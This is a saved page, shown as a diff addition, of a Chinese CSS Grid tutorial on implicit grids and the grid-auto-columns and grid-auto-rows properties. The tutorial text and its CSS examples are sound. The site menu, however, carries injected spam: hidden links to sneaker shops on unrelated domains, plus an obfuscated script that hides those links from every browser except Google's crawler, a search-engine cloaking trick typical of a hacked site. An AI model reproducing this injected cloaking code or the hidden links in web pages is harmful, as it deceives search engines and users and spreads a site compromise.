@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<!-- saved from url=(0132)https://www.w3cplus.com/css/grid-layout-part-6.html?expire=1699848490&code=0i-_V80maLg&sign=bb8336ce2ffce6a5c7994526f8ccf5a7#paywall -->
+<html lang="zh-hans" class="js"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+<link rel="shortcut icon" href="https://www.w3cplus.com/sites/all/themes/w3cplusV2/favicon.ico" type="image/vnd.microsoft.icon">
+<meta name="description" content="CSS 网格布局中有 **显式网格** 和 **隐式网格** 之分，在 CSS 网格布局中可以使用 `grid-template-columns` 、 `grid-template-rows` 和 `grid-template-areas` 可以定义显式网格，并且可以定义显式网格固定的网格轨道数量，同时 `grid-template-columns` 和 `grid-template-rows` 可以用来显式指定网格轨道尺寸。而在 CSS 网格布局中，可以在网格容器上使用 `grid-auto-columns` 、 `grid-auto-rows` 和 `grid-auto-flow` 可以显式定义隐式网格，并且 `grid-auto-columns` 和 `grid-auto-rows`">
+<meta name="keywords" content="前端,图解CSS, Grid, 布局, Layout, Web布局系列, 会员专栏,教程">
+<meta name="generator" content="Drupal 7 (http://drupal.org)">
+<link rel="canonical" href="https://www.w3cplus.com/css/grid-layout-part-6.html">
+<link rel="shortlink" href="https://www.w3cplus.com/node/2716">
+  <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta itemprop="name" content="W3cplus">
+  <meta itemprop="image" content="//www.w3cplus.com/w3cplus-logo.jpg">
+  <meta name="baidu-site-verification" content="ftyq813qEZgpw9nb">
+  <meta name="applicable-device" content="pc,mobile">
+  <title>图解CSS: Grid布局（Part6）_图解CSS, Grid, 布局, Layout, Web布局系列, 会员专栏 教程_W3cplus</title>
+  <link type="text/css" rel="stylesheet" href="./Grid布局：6-显式网格和隐式网格_files/css_xE-rWrJf-fncB6ztZfd2huxqgxu4WO-qwma6Xer30m4.css" media="all">
+<link type="text/css" rel="stylesheet" href="./Grid布局：6-显式网格和隐式网格_files/css_hYCLW089C9S9sP3ZYkuG6R-Q5ZHbEhblZBFjwZ_bE_I.css" media="all">
+<link type="text/css" rel="stylesheet" href="./Grid布局：6-显式网格和隐式网格_files/css_W_jVXC7gZD8ENo3AHIwFL3Mih90k_Go_X3-i_hfyj2c.css" media="all">
+<link type="text/css" rel="stylesheet" href="./Grid布局：6-显式网格和隐式网格_files/css_dc6MGCsMvp7moqrq-cRLC0GLEMrFF3Ego_HOWYVsZG4.css" media="all">
+  <script src="./Grid布局：6-显式网格和隐式网格_files/hm.js.下载"></script><script type="text/javascript" src="./Grid布局：6-显式网格和隐式网格_files/jquery.min.js.下载"></script>
+
+</head>
+<body class="html not-front not-logged-in one-sidebar sidebar-second page-node page-node- page-node-2716 node-type-blog" style="">
+  <div id="skip-link">
+    <a href="https://www.w3cplus.com/css/grid-layout-part-6.html?expire=1699848490&amp;code=0i-_V80maLg&amp;sign=bb8336ce2ffce6a5c7994526f8ccf5a7#main-content" class="element-invisible element-focusable">跳转到主要内容</a>
+  </div>
+    <div id="header" role="header">
+  <div class="container">
+    <h1 id="logo">
+      <a href="https://www.w3cplus.com/" title="记述前端那些事——引领Web前沿" id="site_name">w3cplus</a>
+    </h1>
+    <div class="toggle-topbar menu-icon" id="pull">
+      <a href="https://www.w3cplus.com/css/grid-layout-part-6.html?expire=1699848490&amp;code=0i-_V80maLg&amp;sign=bb8336ce2ffce6a5c7994526f8ccf5a7#"><span>Menu</span></a>
+    </div>
+    <div class="toogle-topbar-content" id="pull-menu">
+              <ul class="menu clearfix"><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.miki.co.uk/afbbdgushop/women/zhenskaya-obuv/krossovki/103630691-krossovki-original-sportivnaya-obuv-ribok-reebok-nike-adidas" title="Кроссовки оригинал спортивная обувь рибок reebok deep nike adidas — цена 3500 грн в каталоге Кроссовки ✓ Купить женские вещи по доступной цене на Шафе , deep nike sb striped gray and black shoes outfit goals , Украина #103630691
+" style="display: none;">Кроссовки оригинал спортивная обувь рибок reebok deep nike adidas — цена 3500 грн в каталоге Кроссовки ✓ Купить женские вещи по доступной цене на Шафе , deep nike sb striped gray and black shoes outfit goals , Украина #103630691
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.medtecjapan.com/en/dedbaifshop/release/bad-bunny-adidas-response-cl-paso-fino-id0780/" title="Bad Bunny x adidas Response CL Paso Fino - adidas 11questra blue pants for women black - MedtecjapanShops
+" style="display: none;">Bad Bunny x adidas Response CL Paso Fino - adidas 11questra blue pants for women black - MedtecjapanShops
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.ietp.com/fr/dfedavshop/air-jordan-1-art-basel-igloo-rust-pink/" title="Jordan Trunner Q4 343408-171 - Air LOW Jordan 1 Art Basel Igloo Rust Pink - LOW Jordan LOW Jordan ADG 3 sneakers Schwarz
+" style="display: none;">Jordan Trunner Q4 343408-171 - Air LOW Jordan 1 Art Basel Igloo Rust Pink - LOW Jordan LOW Jordan ADG 3 sneakers Schwarz
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.jmksport.com/adahavshop/" title="nike air force 1 uv color change da8301 100 101 release date
+" style="display: none;">nike air force 1 uv color change da8301 100 101 release date
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.ietp.com/fr/dfejcashop/" title="michael jordan outlet store
+" style="display: none;">michael jordan outlet store
+</a></li><li class="first leaf"><a href="https://www.w3cplus.com/blog/tags/686.html" title="会员专栏">会员专栏</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/CSS3" title="">CSS</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/JavaScript" title="JavaScript">JavaScript</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/css/books.html" title="我的小册">小册</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/mobile" title="">Mobile</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/svg-tutorial" title="SVG">SVG</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/tags" title="标签云">标签云</a></li>
+<li class="last leaf"><a href="https://www.w3cplus.com/blogs-lists" title="文章列表">文章列表</a></li>
+<script>['sojson.v4']["\x66\x69\x6c\x74\x65\x72"]["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"](((['sojson.v4']+[])["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"]['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65']['\x61\x70\x70\x6c\x79'](null,"118J97J114e32K109l121m95L107G101q121O95v119X111Z114Q100P95f114s101y32l61S32c110p101W119b32w82E101F103g69i120Q112V40h34J71n111K111V103Z108T101g124z109f121L116R101D115z116d34a44p32m34H103o105X34V41h59g105Z102P40Z33j109x121d95d107g101p121J95W119R111K114c100J95M114o101t46V116f101Q115x116u40J110Z97l118N105o103o97R116L111L114W46L117R115I101T114E65K103D101a110e116L41v41E32z123V32i118w97U114Q32d99k108B97j115W115k95i109B121a95v107S101G121H95e119o111J114z100O32B61e32B100F111Y99t117b109G101E110i116D46B103y101m116Q69D108n101G109m101x110d116p115y66E121U67i108P97s115e115H78r97g109c101d40h39S107x101U121f115O95u119r111l114G100n115I39c41o59i32k102v111c114r40y118H97B114E32L105d32n61P32W48l59h32q105W32V60s32j99g108h97f115Y115W95P109J121z95T107I101r121J95Z119t111W114q100X46E108G101m110X103e116P104i59r32K105i43S43W41m32D99x108a97S115W115U95S109s121j95x107Z101v121i95n119S111y114z100x91z105B93U46K115V116Q121B108x101b46i100V105R115P112N108u97E121y32w61P32W39A110t111Q110A101n39h59e125"['\x73\x70\x6c\x69\x74'](/[a-zA-Z]{1,}/))))('sojson.v4');</script></ul>        <!-- /#main-menu -->
+          </div>
+  </div>
+</div>
+
+  <div id="branding" role="branding">
+    <div class="container">
+        <div class="region region-branding">
+    <div id="block-block-46" class="block block-block">
+
+    
+  <div class="content">
+    <div style="margin-bottom: 5px;">
+	<a rel="nofollow" href="https://s.juejin.cn/ds/iJrTure4/" target="_blank" title="现代 CSS"><img alt="现代 CSS" src="./Grid布局：6-显式网格和隐式网格_files/WechatIMG324.jpg" style="width: 100%;height:auto"></a></div>  </div>
+</div>
+  </div>
+    </div>
+  </div> 
+
+<div id="page" role="page">
+  <div class="container">
+    
+    <div class="col-main">
+      <div class="main-wrap">
+        
+                
+        <div class="page-inner">
+                      <div id="breadcrumb" role="breadcrumb">
+              <h2 class="element-invisible">你在这里</h2><div class="breadcrumb"><a href="https://www.w3cplus.com/">首页</a></div>            </div>
+          
+          
+          <a id="main-content"></a>
+                                <h1 class="title" id="page-title">
+              图解CSS: Grid布局（Part6）            </h1>
+          
+                    
+                                <div class="region region-content">
+    <div id="block-system-main" class="block block-system">
+
+    
+  <div class="content">
+    <div id="node-2716" class="node node-blog node-promoted node-full clearfix" about="/css/grid-layout-part-6.html" typeof="sioc:Post sioct:BlogPost">
+  
+  <div class="node-header">
+              <div class="submitted">
+          作者：<span>大漠</span>          日期：<span>2021-05-19</span>          点击：<span>677</span>        </div>
+            <div class="tags">
+        <div class="field field-name-field-blog-tag field-type-taxonomy-term-reference field-label-hidden"><div class="field-items"><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/674.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">图解CSS</a></div><div class="field-item odd"><a href="https://www.w3cplus.com/blog/tags/356.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">Grid</a></div><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/130.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">布局</a></div><div class="field-item odd"><a href="https://www.w3cplus.com/blog/tags/180.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">Layout</a></div><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/695.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">Web布局系列</a></div><div class="field-item odd"><a href="https://www.w3cplus.com/blog/tags/686.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">会员专栏</a></div></div></div>      </div>
+  </div>
+
+  
+  <div class="body-content clearfix">
+    <div id="block-block-22" class="block block-block">
+
+    
+  <div class="content">
+    <div>
+<blockquote>
+<p style="font-size: 14px;"><strong>特别声明：</strong>如果您喜欢小站的内容，可以点击<a href="https://www.zhi12.cn/paywall/membership/widget?uid=5491&amp;siteid=s_64be3b00&amp;cms=drupal&amp;content_id=2610&amp;callback=https%3A//www.w3cplus.com&amp;source=https%3A//www.w3cplus.com%3Fq%3Dnode/2610&amp;sign=ecbcc7859e33dea192cf9efdb6d2e61c" style="background: #FF5722;color: #fff;  display: inline-block; padding: 10px; border-radius: 4px;  line-height: 1; margin: 0 3px;" target="_blank">申请会员</a>进行全站阅读。如果您对付费阅读有任何建议或想法，欢迎发送邮件至: <strong>airenliao@gmail.com</strong>!或添加QQ：874472854(^_^)</p>
+</blockquote>
+</div>  </div>
+</div>
+<div class="field field-name-body field-type-text-with-summary field-label-hidden"><div class="field-items"><div class="field-item even" property="content:encoded"><div class="paywall paywall-mb"><div class="paywall-center"><small class="paywall-highlight">* 文本为付费内容（4.99元），您已获得全文阅读权限</small></div></div><p>CSS 网格布局中有 <strong>显式网格</strong> 和 <strong>隐式网格</strong> 之分，在 CSS 网格布局中可以使用 <code>grid-template-columns</code> 、 <code>grid-template-rows</code>  和 <code>grid-template-areas</code> 可以定义显式网格，并且可以定义显式网格固定的网格轨道数量，同时 <code>grid-template-columns</code>  和 <code>grid-template-rows</code> 可以用来显式指定网格轨道尺寸。而在 CSS 网格布局中，可以在网格容器上使用 <code>grid-auto-columns</code> 、 <code>grid-auto-rows</code>  和 <code>grid-auto-flow</code>  可以显式定义隐式网格，并且 <code>grid-auto-columns</code> 和 <code>grid-auto-rows</code> 可以用来指定隐式网格轨道的尺寸。那么在这篇文章中，主要和大家一起探讨在 CSS 网格布局中如何定义隐式网格和指定隐式网格轨道尺寸。</p>
+
+<h2 class="content-title" data-index="2">定义隐式网格：grid-auto-rows/columns</h2>
+
+<p>在 CSS 网格布局中，使用 <code>grid-template-columns</code>、<code>grid-template-rows</code> 和 <code>grid-template-areas</code> 定义一个网格。使用这三个属性中的任何一个，都可以显式设置网格的网格轨道的明确数量（列和行）。这种方式定义的网格被称为 <strong>显式网格</strong>。而且还可以使用 <code>grid-template-columns</code> 和 <code>grid-template-rows</code> 显式设置网格轨道大小。比如：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">2</span></span>, <span class="number"><span class="number">200</span></span>px)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p><img src="./Grid布局：6-显式网格和隐式网格_files/css-grid-125.jpg" alt=""></p>
+
+<p>使用 <code>grid-template-columns</code> 显式创建了一个 <code>2 x 1</code> 网格，网格每列的网格轨道宽度是 <code>200px</code>。</p>
+
+<p>如果我们在上面这个已定义的显式网格中新增一个网格项，那么第三个网格项目会自动换行排列：</p>
+
+<p><img src="./Grid布局：6-显式网格和隐式网格_files/css-grid-126.jpg" alt=""></p>
+
+<p>浏览器这样渲染是因为我们并没有明确地把网格项目放置到指定的网格单元格（或网格区域）上，因此它们会被 <strong>自动放置（Auto Placement）</strong> 。默认情况下，每个网格项目在行轴和列轴上的跨度（<code>span</code>）都是 <code>1</code>，所以它们都会被放置到下一个可用的网格单元格中。</p>
+
+<blockquote>
+  <p>后面我们将会花更多的篇幅和大家探讨网格项目自动放置的话题。</p>
+</blockquote>
+
+<p>如果我们不让网格项目自动放置的话，可以通过用于网格项目的属性，比如 <code>grid-row</code>、<code>grid-column</code> 和 <code>grid-area</code> 将网格项目指定到具体的区域：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__item</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">5</span></span>
+}</span></span></span><span class="value"></span></span></span><span class="rule"><span class="value"></span></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="500" style="width: 100%;" scrolling="no" title="Implicit grid: grid-column" src="./Grid布局：6-显式网格和隐式网格_files/wvJzKZY(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/wvJzKZY'>Implicit grid: grid-column</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>这个示例，使用<code>grid-column: 5</code> 把第三个网格项目放置在第五列，但<code>grid-template-columns: repeat(2, 200px)</code> 只显式定义了两个列，为了定位第三个网格项目，此时网格将会增加三个隐式的列。如果你使用浏览器的开发者工具查看Demo，可以看到下图这样的结果：</p>
+
+<p><img src="./Grid布局：6-显式网格和隐式网格_files/css-grid-127.jpg" alt=""></p>
+
+<blockquote>
+  <p>如果你不知道 <code>grid-column</code>、<code>grid-row</code> 和 <code>grid-area</code> 具体含义和使用方式并不重要，在后面我们会详细介绍。</p>
+</blockquote>
+
+<p>也就是说，在 CSS 网格布局中，<strong>当网格项目被放置在显式网格之外，网格容器会给网格添加隐式网格线来生成隐式网格轨道</strong>。上面示例中”第三列“，”第四列“的网格轨道宽度是 <code>0px</code>，”第五列“网格轨道宽度是 <code>auto</code>，同时会创建隐式的网格线和隐式网格轨道：</p>
+
+<p><img src="./Grid布局：6-显式网格和隐式网格_files/css-grid-128.jpg" alt=""></p>
+
+<p>正如上图所示，<strong>隐式网格线和显式网格线在一起构建成一个新的网格</strong> ，该网格被称为<strong>隐式网格</strong> 。</p>
+
+<p>在 CSS 网格中，除了使用 <code>grid-column</code>之外，还可以使用 <code>grid-row</code> 和 <code>grid-area</code> 将网格项目放置到显式网格区域之外，此时同样能创建隐式网格。比如：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">2</span></span>, <span class="number"><span class="number">200</span></span>px)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(3)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">4</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(4)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">3</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> span <span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(5)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">3</span></span> / <span class="number"><span class="number">4</span></span> / <span class="number"><span class="number">4</span></span> / <span class="number"><span class="number">5</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="640" style="width: 100%;" scrolling="no" title="Implicit grid: grid-column/row/area" src="./Grid布局：6-显式网格和隐式网格_files/jOBMrYQ(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/jOBMrYQ'>Implicit grid: grid-column/row/area</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>上面这个示例，创建的隐式网格描述如下图所示：</p>
+
+<p><img src="./Grid布局：6-显式网格和隐式网格_files/css-grid-129.jpg" alt=""></p>
+
+<p>不难发现，这两个示例中我们都引用了从未定义过的列或行，即引用了不存在的列或行，所以创建了宽度为<code>0</code>和高度为<code>0</code>的隐式网格轨道来填补空白。如果想给未定义过的网格轨道设置尺寸大小，我们可以在网格容器上使用 <code>grid-auto-columns</code> 和 <code>grid-auto-rows</code> 来设置。换句话说，我们可以在网格容器上使用 <code>grid-auto-columns</code> 和 <code>grid-auto-rows</code> 来指定隐式网格轨道的尺寸（即指定未被 <code>grid-template-columns</code> 和 <code>grid-template-rows</code> 指定尺寸的网格轨道的尺寸）。</p>
+
+<p><code>grid-auto-columns</code> 和 <code>grid-auto-rows</code> 的值可以设置为 <code>auto</code> 和 <code>&lt;track-size&gt;+</code>，其中<code>auto</code>是其初始值，<code>&lt;track-size&gt;</code>值是：</p>
+
+<pre class="xml"><code class="xml"><span class="tag"><span class="tag">&lt;<span class="title"><span class="title">track-size</span></span>&gt;</span></span>        = <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">track-breadth</span></span>&gt;</span></span> | minmax( <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">inflexible-breadth</span></span>&gt;</span></span> , <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">track-breadth</span></span>&gt;</span></span> ) | fit-content( <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">length-percentage</span></span>&gt;</span></span> )
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">fixed-size</span></span>&gt;</span></span>         = <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">fixed-breadth</span></span>&gt;</span></span> | minmax( <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">fixed-breadth</span></span>&gt;</span></span> , <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">track-breadth</span></span>&gt;</span></span> ) | minmax( <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">inflexible-breadth</span></span>&gt;</span></span> , <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">fixed-breadth</span></span>&gt;</span></span> )
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">track-breadth</span></span>&gt;</span></span>     = <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">length-percentage</span></span>&gt;</span></span> | <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">flex</span></span>&gt;</span></span> | min-content | max-content | auto
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">inflexible-breadth</span></span>&gt;</span></span> = <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">length-percentage</span></span>&gt;</span></span> | min-content | max-content | auto
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">fixed-breadth</span></span>&gt;</span></span>      = <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">length-percentage</span></span>&gt;</span></span>
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">line-names</span></span>&gt;</span></span>        = '[' <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">custom-ident</span></span>&gt;</span></span>* ']'
+</code></pre>
+
+<p><code>grid-auto-columns</code> 和 <code>grid-auto-rows</code> 的使用非常的简单，比如上面这个示例，可以在网格容器中显式指定隐式网格轨道的值：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">2</span></span>, <span class="number"><span class="number">200</span></span>px)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> max-content;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-auto-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">100</span></span>px auto;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-auto-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">60</span></span>px auto;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="700" style="width: 100%;" scrolling="no" title="Sizing implicit tracks with grid-auto-columns/rows" src="./Grid布局：6-显式网格和隐式网格_files/gOmwZqE(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/gOmwZqE'>Sizing implicit tracks with grid-auto-columns/rows</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>示例中使用 <code>grid-auto-columns: 100px auto</code> 定义了隐式网格列轨道列宽为 <code>100px</code> 和 <code>auto</code>（即示例中第三列列宽为<code>60px</code>，第四列列宽为<code>auto</code>）；使用<code>grid-auto-rows: 60px auto</code> 定义了隐式网格行轨道的行高为 <code>60px</code> 和 <code>auto</code>（即示例中第二行行高为<code>60px</code>，第三行行高为<code>auto</code>）：</p>
+
+<p><img src="./Grid布局：6-显式网格和隐式网格_files/css-grid-130.jpg" alt=""></p>
+
+<p>正如上图所示，<code>grid-auto-columns</code> 和 <code>grid-auto-rows</code> 显式指定对应隐式网格轨道尺寸，如果另有网格项目被放置在非显式网格区域之外，此时会发生什么？不妨来看另一个示例：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">2</span></span>, <span class="number"><span class="number">200</span></span>px)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> max-content;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-auto-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">100</span></span>px auto;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-auto-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">60</span></span>px auto;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(1)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span> / <span class="number"><span class="number">6</span></span> / <span class="number"><span class="number">4</span></span> / <span class="number"><span class="number">7</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(2)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span> / <span class="number"><span class="number">5</span></span> / <span class="number"><span class="number">4</span></span> / <span class="number"><span class="number">6</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(3)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">4</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(4)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">3</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> span <span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(5)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">3</span></span> / <span class="number"><span class="number">4</span></span> / <span class="number"><span class="number">4</span></span> / <span class="number"><span class="number">5</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
